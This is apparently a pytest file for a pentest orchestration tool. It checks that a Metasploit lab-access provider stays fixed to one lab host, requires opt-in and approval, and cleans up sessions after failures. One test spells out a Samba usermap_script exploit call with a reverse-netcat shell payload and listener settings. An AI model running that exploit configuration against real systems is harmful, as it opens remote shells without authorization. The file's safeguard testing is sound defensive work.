from __future__ import annotations

import json

import pytest

from whaxon.core.capabilities import CapabilityRegistry, CapabilityUnavailable
from whaxon.core.lab_access import MetasploitableLabAccessProvider
from whaxon.core.scope import ScopeManager
from whaxon.core.store import JobStore
from whaxon.core.workflow import WorkflowTask


class _FixedMsf:
    def __init__(
        self, host="127.0.0.1", *, preexisting=False, fail_poll=False,
        missing_job_id=False,
    ):
        self.calls = []
        self.config = type("Config", (), {"host": host})()
        self._sessions = {}
        self.stopped = []
        self.stopped_jobs = []
        self.snapshot_calls = 0
        self.fail_poll = fail_poll
        self.missing_job_id = missing_job_id
        if preexisting:
            self._sessions["7"] = self._matching_session()

    def execute_rpc(self, module_type, module, options, *, payload, timeout_s):
        self.calls.append((module_type, module, options, payload, timeout_s))
        if not self._sessions:
            self._sessions["7"] = self._matching_session()
        return {} if self.missing_job_id else {"job_id": "msf-remote-23"}

    @staticmethod
    def _matching_session():
        return {
            "via_exploit": "exploit/multi/samba/usermap_script",
            "target_host": "172.28.0.10:139", "type": "shell",
        }

    def sessions(self, *, strict=False):
        self.snapshot_calls += 1
        if self.fail_poll and self.snapshot_calls == 2:
            raise RuntimeError("injected session polling failure")
        return dict(self._sessions)

    def connect(self):
        return self

    def call(self, method, args):
        if method == "job.stop":
            job_id = str(args[0])
            self.stopped_jobs.append(job_id)
            return {"result": "success"}
        if method == "job.list":
            return {}
        assert method == "session.stop"
        session_id = str(args[0])
        self.stopped.append(session_id)
        self._sessions.pop(session_id, None)
        return {"result": "success"}


@pytest.fixture
def lab_provider(tmp_path, monkeypatch):
    data_dir = tmp_path / "data"
    data_dir.mkdir()
    scope_path = data_dir / "scope.json"
    scope_path.write_text(json.dumps({
        "engagement": "controlled-lab",
        "enabled": True,
        "in_scope": ["172.28.0.10"],
        "out_of_scope": [],
        "notes": "unit-test fixture",
    }), encoding="utf-8")
    store = JobStore(data_dir / "jobs.db")
    registry = CapabilityRegistry(store)
    msf = _FixedMsf()
    provider = MetasploitableLabAccessProvider(
        store=store, registry=registry, scope=ScopeManager(scope_path), msf=msf,
    )
    monkeypatch.setenv(MetasploitableLabAccessProvider.ENABLE_ENV, "1")
    return provider, store, msf


def _task(*, target="172.28.0.10", inputs=None):
    return WorkflowTask(
        id="lab-access", capability_id=MetasploitableLabAccessProvider.CAPABILITY,
        target=target, inputs=inputs or {}, permissions=("network.exploit",),
        impact="critical", timeout_s=90,
    )


def test_lab_access_is_fixed_to_the_repository_target(lab_provider):
    provider, _, msf = lab_provider
    with pytest.raises(ValueError, match=r"fixed to 172\.28\.0\.10"):
        provider.resolve_task(_task(target="172.28.0.11"))
    assert not msf.calls


def test_lab_access_rejects_dynamic_module_or_payload_inputs(lab_provider):
    provider, _, msf = lab_provider
    with pytest.raises(ValueError, match="no dynamic inputs"):
        provider.resolve_task(_task(inputs={"module": "exploit/other"}))
    assert not msf.calls


def test_lab_access_requires_explicit_opt_in(lab_provider, monkeypatch):
    provider, _, msf = lab_provider
    monkeypatch.delenv(MetasploitableLabAccessProvider.ENABLE_ENV)
    with pytest.raises(CapabilityUnavailable, match="opt-in is disabled"):
        provider.resolve_task(_task())
    assert not msf.calls


def test_lab_access_reloads_scope_and_refuses_revoked_target(lab_provider):
    provider, _, msf = lab_provider
    scope_path = provider.scope.path
    scope_path.write_text(json.dumps({
        "engagement": "controlled-lab", "enabled": True,
        "in_scope": ["172.28.0.11"], "out_of_scope": [],
    }), encoding="utf-8")
    with pytest.raises(ValueError, match="out of scope"):
        provider.resolve_task(_task())
    assert not msf.calls


def test_lab_access_refuses_non_loopback_msf_rpc(lab_provider):
    provider, _, msf = lab_provider
    msf.config.host = "192.0.2.20"
    with pytest.raises(ValueError, match="RPC must bind to loopback"):
        provider.resolve_task(_task())
    assert not msf.calls


def test_lab_critical_impact_requires_exact_persisted_plan_approval(
    lab_provider, monkeypatch,
):
    import time

    from whaxon.core import Core
    from whaxon.core.providers import BoundProviderRouter
    from whaxon.core.workflow import WorkflowPlan

    provider, store, _ = lab_provider
    core = Core.__new__(Core)
    core.store = store
    core.scope = provider.scope
    core.capabilities = provider.registry
    core.providers = BoundProviderRouter((provider,))
    task = _task()
    plan = WorkflowPlan("lab-mission", (task,), metadata={
        "provider_bindings": {task.id: {
            "provider_id": provider.PROVIDER_ID,
            "manifest_fingerprint": provider.manifest.fingerprint,
        }},
    })
    store.create_mission("lab-mission", "controlled repository lab")
    store.save_workflow_plan("lab-plan", plan)
    assert core.authorize_workflow_task_for_plan("lab-plan", task) is False
    store.grant_workflow_approval(
        "lab-plan", task.id, "lab-approval", "operator",
        expires_at=time.time() + 300,
    )
    assert core.authorize_workflow_task_for_plan("lab-plan", task) is True
    monkeypatch.setenv(provider.ENABLE_ENV, "0")
    assert core.authorize_workflow_task_for_plan("lab-plan", task) is False
    monkeypatch.setenv(provider.ENABLE_ENV, "1")
    assert core.authorize_workflow_task_for_plan("lab-plan", _task(target="172.28.0.11")) is False


@pytest.mark.asyncio
async def test_lab_access_uses_only_fixed_exploit_options_and_seals_job(lab_provider):
    provider, store, msf = lab_provider
    result = await provider.dispatch(_task())
    assert result["session_id"] == "7"
    assert msf.calls == [(
        "exploit", "multi/samba/usermap_script",
        {"RHOSTS": "172.28.0.10", "RPORT": "139", "LHOST": "172.28.0.11",
         "LPORT": "4444"},
        "cmd/unix/reverse_netcat", 60.0,
    )]
    assert store.get_findings(result["job_id"])[0]["data"]["session_id"] == "7"
    finding = store.get_findings(result["job_id"])[0]
    assert finding["data"]["msf_job_id"] == "msf-remote-23"
    assert finding["data"]["session_retention"] == "open_until_operator_closes_in_metasploit"
    session = store.get_session("7")
    assert session["info"]["msf_job_id"] == "msf-remote-23"
    assert session["info"]["evidence_job_id"] == result["job_id"]


@pytest.mark.asyncio
async def test_lab_access_does_not_reuse_a_preexisting_matching_session(
    lab_provider, monkeypatch,
):
    provider, store, msf = lab_provider
    msf._sessions["7"] = msf._matching_session()
    monkeypatch.setattr(provider, "SESSION_WAIT_S", 0.0)
    with pytest.raises(RuntimeError, match="no new matching target session"):
        await provider.dispatch(_task())
    row = store.history(limit=10)[0]
    assert row["status"] == "failed"
    assert msf.stopped_jobs == ["msf-remote-23"]
    assert "msf-remote-23" in " ".join(
        line["text"] for line in store.get(row["id"])["lines"]
    )


@pytest.mark.asyncio
async def test_lab_access_stops_new_session_if_evidence_persistence_fails(lab_provider, monkeypatch):
    provider, store, msf = lab_provider

    def fail_session_persist(*args, **kwargs):
        raise OSError("injected evidence persistence error")

    monkeypatch.setattr(store, "upsert_session", fail_session_persist)
    with pytest.raises(OSError, match="injected evidence persistence error"):
        await provider.dispatch(_task())
    assert msf.stopped == ["7"]
    row = store.history(limit=10)[0]
    assert row["status"] == "failed"
    assert msf.stopped_jobs == ["msf-remote-23"]


@pytest.mark.asyncio
async def test_lab_access_stops_remote_job_when_session_polling_fails(lab_provider):
    provider, store, msf = lab_provider
    msf.fail_poll = True
    with pytest.raises(RuntimeError, match="injected session polling failure"):
        await provider.dispatch(_task())
    assert msf.stopped_jobs == ["msf-remote-23"]
    assert msf.stopped == ["7"]
    row = store.history(limit=10)[0]
    assert row["status"] == "failed"
    assert "Metasploit failure cleanup" in " ".join(
        line["text"] for line in store.get(row["id"])["lines"]
    )


@pytest.mark.asyncio
async def test_lab_access_cleans_new_session_when_rpc_omits_job_id(
    lab_provider, monkeypatch,
):
    provider, store, msf = lab_provider
    msf.missing_job_id = True

    with pytest.raises(RuntimeError, match="exploit did not start"):
        await provider.dispatch(_task())

    assert msf.stopped == ["7"]
    assert msf.stopped_jobs == []
    row = store.history(limit=10)[0]
    assert row["status"] == "failed"
    lines = " ".join(line["text"] for line in store.get(row["id"])["lines"])
    assert "Metasploit module.execute returned an invalid response" not in lines
    assert "stopped_sessions=7" in lines
